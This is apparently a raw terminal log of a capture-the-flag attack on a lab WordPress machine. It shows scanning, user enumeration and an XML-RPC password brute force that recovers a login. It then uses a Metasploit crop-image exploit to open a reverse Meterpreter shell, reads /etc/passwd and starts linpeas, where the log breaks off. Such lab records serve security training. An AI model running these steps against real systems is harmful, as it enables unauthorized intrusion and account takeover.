```
root@kali:~# nmap -sV -sC -T5 -p- 10.10.110.184
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-13 12:33 UTC
Nmap scan report for ip-10-10-110-184.eu-west-1.compute.internal (10.10.110.184)
Host is up (0.0012s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:35:F3:37:87:50 (Unknown)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2020-07-13T12:33:34+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-07-13T12:33:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.18 seconds
root@kali:~#
```


```
root@kali:~# wpscan --url http://blog.thm --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ R
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/
[+] Started: Mon Jul 13 12:40:23 2020

Interesting Finding(s):

[+] http://blog.thm/
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2020-06-10T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Mon Jul 13 12:40:26 2020
[+] Requests Done: 51
[+] Cached Requests: 8
[+] Data Sent: 11.327 KB
[+] Data Received: 385.417 KB
[+] Memory used: 157.906 MB
[+] Elapsed time: 00:00:02
root@kali:~#
```


```
root@kali:~# wpscan -U user.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.thm
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ R
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/
[+] Started: Mon Jul 13 12:45:52 2020

Interesting Finding(s):

[+] http://blog.thm/
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2020-06-10T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <================================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 4 user/s
[SUCCESS] - kwheel / cutiepie1
```

- https://www.cvedetails.com/cve/CVE-2019-8942/
```
root@kali:~# msfconsole
msf5 > search crop

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Chec                                                                                                                                                             k  Description
   -  ----                                      ---------------  ----       ----                                                                                                                                                             -  -----------
   0  exploit/multi/http/wp_crop_rce            2019-02-19       excellent  Yes

msf5 exploit(multi/http/wp_crop_rce) > run

[*] Started reverse TCP handler on 10.10.132.51:4444
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (38288 bytes) to 10.10.180.207
[*] Meterpreter session 1 opened (10.10.132.51:4444 -> 10.10.180.207:42194) at 2020-07-19 13:25:32 +0000
ls
[*] Attempting to clean up files...

meterpreter > ls
Listing: /var/www/wordpress
===========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100640/rw-r-----  235    fil   2020-05-28 12:15:42 +0000  .htaccess
100640/rw-r-----  235    fil   2020-05-28 03:44:26 +0000  .htaccess_backup
100644/rw-r--r--  1113   fil   2020-07-19 13:25:33 +0000  UGnqDEaRZi.php
100640/rw-r-----  418    fil   2013-09-25 00:18:11 +0000  index.php
100640/rw-r-----  19935  fil   2020-05-26 15:39:37 +0000  license.txt
100640/rw-r-----  7415   fil   2020-05-26 15:39:37 +0000  readme.html
100640/rw-r-----  5458   fil   2020-05-26 15:39:37 +0000  wp-activate.php
40750/rwxr-x---   4096   dir   2018-12-06 18:00:07 +0000  wp-admin
100640/rw-r-----  364    fil   2015-12-19 11:20:28 +0000  wp-blog-header.php
100640/rw-r-----  1889   fil   2018-05-02 22:11:25 +0000  wp-comments-post.php
100640/rw-r-----  2853   fil   2015-12-16 09:58:26 +0000  wp-config-sample.php
100640/rw-r-----  3279   fil   2020-05-28 03:49:17 +0000  wp-config.php
40750/rwxr-x---   4096   dir   2020-05-26 03:52:32 +0000  wp-content
100640/rw-r-----  3669   fil   2017-08-20 04:37:45 +0000  wp-cron.php
40750/rwxr-x---   12288  dir   2018-12-06 18:00:08 +0000  wp-includes
100640/rw-r-----  2422   fil   2016-11-21 02:46:30 +0000  wp-links-opml.php
100640/rw-r-----  3306   fil   2017-08-22 11:52:48 +0000  wp-load.php
100640/rw-r-----  37286  fil   2020-05-26 15:39:37 +0000  wp-login.php
100640/rw-r-----  8048   fil   2017-01-11 05:13:43 +0000  wp-mail.php
100640/rw-r-----  17421  fil   2018-10-23 07:04:39 +0000  wp-settings.php
100640/rw-r-----  30091  fil   2018-04-29 23:10:26 +0000  wp-signup.php
100640/rw-r-----  4620   fil   2017-10-23 22:12:51 +0000  wp-trackback.php
100640/rw-r-----  3065   fil   2016-08-31 16:31:29 +0000  xmlrpc.php

```


```
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
bjoel:x:1000:1000:Billy Joel:/home/bjoel:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
smb:x:1001:1001::/srv/smb/files:/usr/sbin/nologin
```

```
meterpreter > ls /home/bjoel
Listing: /home/bjoel
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
20666/rw-rw-rw-   0      cha   2020-07-19 13:05:55 +0000  .bash_history
100644/rw-r--r--  220    fil   2018-04-04 18:30:26 +0000  .bash_logout
100644/rw-r--r--  3771   fil   2018-04-04 18:30:26 +0000  .bashrc
40700/rwx------   4096   dir   2020-05-25 13:15:58 +0000  .cache
40700/rwx------   4096   dir   2020-05-25 13:15:58 +0000  .gnupg
100644/rw-r--r--  807    fil   2018-04-04 18:30:26 +0000  .profile
100644/rw-r--r--  0      fil   2020-05-25 13:16:22 +0000  .sudo_as_admin_successful
100644/rw-r--r--  69106  fil   2020-05-26 18:33:24 +0000  Billy_Joel_Termination_May20-2020.pdf
100644/rw-r--r--  57     fil   2020-05-26 20:08:47 +0000  user.txt
```

```
meterpreter > cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
```

```
python -c 'import pty; pty.spawn("/bin/sh")'
$ whoami
whoami
www-data
```

```
$ ./linpeas.sh
./linpeas.sh


                     ??????????????
             ???????             ?????????
      ???????      ????????????????????  ?????
  ????     ? ?????????????????????????????? ???????
  ?    ?????????????????????????????????????????????
  ???????????????????? ?????       ?????????????????
  ???????????          ??????               ?????? ?
  ??????              ????????                 ????
  ??                  ??? ?????                  ???
  ??                ????????????                  ??
  ?            ?? ?????????????????????????????   ??
  ?      ???????????????????????????????????????????
  ??????????????                                ????
  ?????  ?????                       ??????     ????
  ????   ?????                       ?????      ? ??
  ?????  ?????        ???????        ?????     ?????
  ??????  ???????      ???????      ???????   ?????
   ??????????????        ?          ???????????????
  ?????????????                       ??????????????
  ???????????                         ??????????????
  ??????????????????            ????????????????????
   ??????   ?????????????????????????? ?????????????
        ????????      ??????????  ??????????
             ?????????????????????????
    linpeas v2.5.4 by carlospolop

ADVISORY: linpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMangeta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.15.0-101-generic (buildd@lgw01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: blog
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . DONE
====================================( System Information )====================================
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.15.0-101-generic (buildd@lgw01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.21p2

[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

[+] Date
Sun Jul 19 13:42:14 UTC 2020

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on
/dev/xvda2       15G  4.6G  9.4G  33% /
udev            461M     0  461M   0% /dev
tmpfs           492M     0  492M   0% /dev/shm
tmpfs            99M  2.4M   96M   3% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           492M     0  492M   0% /sys/fs/cgroup
/dev/loop1       94M   94M     0 100% /snap/core/9066
/dev/loop0       90M   90M     0 100% /snap/core/8268
              total        used        free      shared  buff/cache   available
Mem:        1006820      374608      173360       21828      458852      445420
Swap:             0           0           0

[+] Environment
[i] Any private information inside environment variables?
HISTFILESIZE=0
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:19293
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=bd52258fb3fa41a3870c9726407840eb
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Looking for Signature verification failed in dmseg
 Not Found

[+] selinux enabled? .............. sestatus Not Found
[+] Printer? ...................... lpstat Not Found
[+] Is this a container? .......... No
[+] Is ASLR enabled? .............. Yes


=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)

[+] Unmounted file-system?
[i] Check if you can mount umounted devices
/dev/disk/by-uuid/34cb9bd4-4d90-4587-a166-66f07670be55  /       ext4    defaults        0 0


====================================( Available Software )====================================
[+] Useful software
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/gcc
/usr/bin/gdb
/usr/bin/base64
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.6
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo

[+] Installed Compiler
ii  gcc                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler
ii  gcc-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C compiler
/usr/bin/gcc
/usr/share/gcc-8


================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
daemon     829  0.0  0.2  28332  2524 ?        Ss   13:06   0:00 /usr/sbin/atd -f
message+   838  0.0  0.4  50104  4656 ?        Ss   13:06   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
mysql     1051  0.1 19.9 1165364 200456 ?      Sl   13:06   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root         1  0.1  0.8 159800  8732 ?        Ss   13:05   0:02 /sbin/init maybe-ubiquity
root       401  0.0  2.5 124816 25984 ?        S<s  13:05   0:00 /lib/systemd/systemd-journald
root       424  0.0  0.1  97708  1708 ?        Ss   13:05   0:00 /sbin/lvmetad -f
root       427  0.0  0.5  46796  5792 ?        Ss   13:05   0:00 /lib/systemd/systemd-udevd
root       868  0.0  1.2 264064 12348 ?        Ss   13:06   0:00 /usr/sbin/nmbd --foreground --no-process-group
root       869  0.0  0.3  30028  3172 ?        Ss   13:06   0:00 /usr/sbin/cron -f
root       870  0.0  0.6 286256  6884 ?        Ssl  13:06   0:00 /usr/lib/accountsservice/accounts-daemon
root       878  0.0  1.7 169092 17236 ?        Ssl  13:06   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       879  0.0  0.1 604856  2008 ?        Ssl  13:06   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       895  0.0  0.5  62128  5904 ?        Ss   13:06   0:00 /lib/systemd/systemd-logind
root       909  0.0  2.4 561188 25112 ?        Ssl  13:06   0:00 /usr/lib/snapd/snapd
root       933  0.0  0.2  14664  2388 ttyS0    Ss+  13:06   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       939  0.0  0.1  14888  1980 tty1     Ss+  13:06   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       942  0.0  0.7 291396  7324 ?        Ssl  13:06   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       945  0.0  1.9 185952 20124 ?        Ssl  13:06   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       963  0.0  0.6  72300  6452 ?        Ss   13:06   0:00 /usr/sbin/sshd -D
root       991  0.0  2.8 501948 28756 ?        Ss   13:06   0:00 /usr/sbin/apache2 -k start
root      1013  0.0  2.0 355412 20240 ?        Ss   13:06   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1069  0.0  0.5 343660  5880 ?        S    13:06   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1070  0.0  0.4 343684  4576 ?        S    13:06   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1113  0.0  0.6 355396  6944 ?        S    13:06   0:00 /usr/sbin/smbd --foreground --no-process-group
syslog     901  0.0  0.4 263036  4396 ?        Ssl  13:06   0:00 /usr/sbin/rsyslogd -n
systemd+   609  0.0  0.3 141936  3208 ?        Ssl  13:05   0:00 /lib/systemd/systemd-timesyncd
systemd+   708  0.0  0.5  80060  5228 ?        Ss   13:06   0:00 /lib/systemd/systemd-networkd
systemd+   728  0.0  0.5  70640  5112 ?        Ss   13:06   0:00 /lib/systemd/systemd-resolved
www-data  1106  0.0  4.5 583824 45552 ?        S    13:06   0:00 /usr/sbin/apache2 -k start
www-data  1595  0.0  4.3 508552 43968 ?        S    13:09   0:00 /usr/sbin/apache2 -k start
www-data  1615  0.0  3.9 507852 39396 ?        S    13:09   0:00 /usr/sbin/apache2 -k start
www-data  1620  0.0  4.3 583576 43768 ?        S    13:09   0:00 /usr/sbin/apache2 -k start
www-data  1625  0.0  4.3 582344 43452 ?        S    13:09   0:00 /usr/sbin/apache2 -k start
www-data  1627  0.3  4.2 583684 42388 ?        S    13:09   0:07 /usr/sbin/apache2 -k start
www-data  1628  0.0  4.2 583624 42748 ?        S    13:09   0:00 /usr/sbin/apache2 -k start
www-data  1631  0.0  4.4 584068 44532 ?        S    13:09   0:00 /usr/sbin/apache2 -k start
www-data  1648  0.0  3.9 583780 40064 ?        S    13:11   0:00 /usr/sbin/apache2 -k start
www-data  1654  0.0  4.4 584124 44708 ?        S    13:16   0:00 /usr/sbin/apache2 -k start
www-data  1824  0.0  0.0   4628   832 ?        S    13:39   0:00 sh -c /bin/sh
www-data  1825  0.0  0.0   4628   860 ?        S    13:39   0:00 /bin/sh
www-data  1830  0.0  0.7  33220  7320 ?        S    13:40   0:00 python -c import pty; pty.spawn("/bin/sh")
www-data  1831  0.0  0.0   4628   816 pts/0    Ss   13:40   0:00 /bin/sh
www-data  1839  0.3  0.2   4968  2224 pts/0    S+   13:42   0:00 /bin/sh ./linpeas.sh
www-data  2284  0.0  0.3  36700  3212 pts/0    R+   13:42   0:00 ps aux
www-data  2286  0.0  0.0  13068   972 pts/0    S+   13:42   0:00 sort

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
lrwxrwxrwx 1 root root        4 Feb  3 18:22 /bin/sh -> dash
-rwxr-xr-x 1 root root   129096 May  3 11:30 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   219272 May  3 11:30 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root  1637456 May  3 11:30 /lib/systemd/systemd-networkd
-rwxr-xr-x 1 root root   378944 May  3 11:30 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root root    38976 May  3 11:30 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   584136 May  3 11:30 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    56552 Mar  5 17:23 /sbin/agetty
lrwxrwxrwx 1 root root       20 May  3 11:30 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root    84104 Jan 23 15:45 /sbin/lvmetad
-rwxr-xr-x 1 root root   236584 Jun 10  2019 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    18504 Mar 31 16:20 /usr/bin/lxcfs
lrwxrwxrwx 1 root root        9 Oct 25  2018 /usr/bin/python3 -> python3.6
-rwxr-xr-x 1 root root   182552 Dec 18  2017 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root    14552 Mar 27  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root 18927720 Oct 30  2019 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root   671392 Mar 13 12:26 /usr/sbin/apache2
-rwxr-xr-x 1 root root    26632 Feb 20  2018 /usr/sbin/atd
-rwxr-xr-x 1 root root    47416 Nov 16  2017 /usr/sbin/cron
-rwxr-xr-x 1 root root 24646760 Apr 29 16:40 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   247832 Apr 22 15:48 /usr/sbin/nmbd
-rwxr-xr-x 1 root root   680488 Apr 24  2018 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root    84064 Apr 22 15:48 /usr/sbin/smbd
-rwxr-xr-x 1 root root   786856 Mar  4  2019 /usr/sbin/sshd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 May 26 03:22 .
drwxr-xr-x 100 root root 4096 Jun  1 14:28 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  589 Jan 14  2020 mdadm
-rw-r--r--   1 root root  712 Jan 17  2018 php
-rw-r--r--   1 root root  191 Feb  3 18:23 popularity-contest

/etc/cron.daily:
total 68
drwxr-xr-x   2 root root 4096 May 29 23:47 .
drwxr-xr-x 100 root root 4096 Jun  1 14:28 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x   1 root root  376 Nov 20  2017 apport
-rwxr-xr-x   1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x   1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x   1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x   1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x   1 root root  383 Mar 29  2019 samba
-rwxr-xr-x   1 root root  246 Mar 21  2018 ubuntu-advantage-tools
